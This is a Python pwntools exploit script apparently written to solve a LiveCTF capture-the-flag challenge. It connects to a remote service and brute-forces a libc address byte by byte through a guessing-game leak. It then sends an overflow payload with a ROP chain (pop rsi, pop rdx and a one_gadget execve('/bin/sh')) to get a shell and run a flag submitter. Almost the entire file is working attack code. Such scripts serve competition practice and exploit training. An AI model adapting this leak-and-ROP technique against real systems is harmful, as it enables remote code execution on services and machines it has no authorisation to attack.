#!/usr/bin/env python3

from pwn import *
import time

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


#exe = ELF("challenge_patched")
#libc = ELF("libc.so.6")
#ld = ELF("ld-linux-x86-64.so.2")
#
#context.binary = exe


#def conn():
#    if args.LOCAL:
#        r = process([exe.path])
#        if args.DEBUG:
#            gdb.attach(r)
#    else:
#        r = remote("addr", 1337)
#
#    return r

def exploit(guess, r):
    r.sendline('10')
    r.sendline('2')
    r.sendline(b'\x8d'*10)
    payload = b'\x8d'*0x46
    payload += p64(guess)
    payload += b'\x42'*0x1a
    payload += p32(0)+p32(0x70)
    payload += p32(0)+p32(0x1000)+p32(0xa)+p32(0x7)+p32(0xa)+b'A'*0x7
    #print(len(payload))
    r.sendlineafter('2?', payload)
    r.recvuntil('[1;30;42m A ')
    important = r.recvuntil(b' \x1b[1;30;42m \x00', drop=True)
    r.recvuntil('You lose!')
    return important


pop_rdi = 0x000000000002a3e5#: pop rdi; ret;
pop_rsi = 0x000000000002be51#: pop rsi; ret;
pop_rdx = 0x000000000011f497#: pop rdx; pop r12; ret;
one_gadget = 0xebcf8 #execve("/bin/sh", rsi, rdx)
#constraints:
#  address rbp-0x78 is writable
#  [rsi] == NULL || rsi == NULL || rsi is a valid argv
#  [rdx] == NULL || rdx == NULL || rdx is a valid envp

def final(r, libc):
    r.sendline('10')
    r.sendline('2')
    r.sendline(b'\xba'*10)
    payload = b'\xba'*0x46
    payload += p64(libc)
    payload += b'\x42'*0x1a
    payload += p32(0)+p32(0x70)
    payload += p32(0)+p32(0x1000)+p32(0xa)+p32(0x7)+p16(0xa)+p64(libc+0x0000000021a000)

    rop = p64(libc+pop_rsi)
    rop += p64(0)
    rop += p64(libc+pop_rdx)
    rop += p64(0)
    rop += p64(0)
    rop += p64(libc+one_gadget)
    payload += rop
    print(hex(len(payload)))
    r.sendlineafter('2?', payload)
    r.sendline(b'./submitter')
    flag = r.recvline_contains(b'LiveCTF{').decode().strip()
    log.info('Flag: %s', flag)

def main():
    r = remote(HOST, int(PORT))

    #gdb.attach(r, gdbscript="b *print_guess")
    slots = [0x41, 0x21, 0x21, 0x21, 0x21, 0x21]
    for x in range(0x100):
        guess = 0
        for i in range(6):
            guess = guess | slots[i] << (i * 8)
        #print(hex(guess))

        new_data = exploit(guess, r).split(b' \x1b')
        #print(new_data)
        for i in range(5):
            if b'42m' not in new_data[i]:
                slots[i+1] += 1
                if slots[i+1] == 0x9:
                    slots[i+1] += 3
    libc = 0
    for i in range(6):
        libc = libc | slots[i] << (i * 8)
    libc = libc - 0x29D41
    print(hex(libc))
    print(slots)
    #gdb.attach(r, gdbscript="b *print_guess")
    
    final(r, libc)
    # good luck pwning :)

    #r.interactive()


if __name__ == "__main__":
    main()
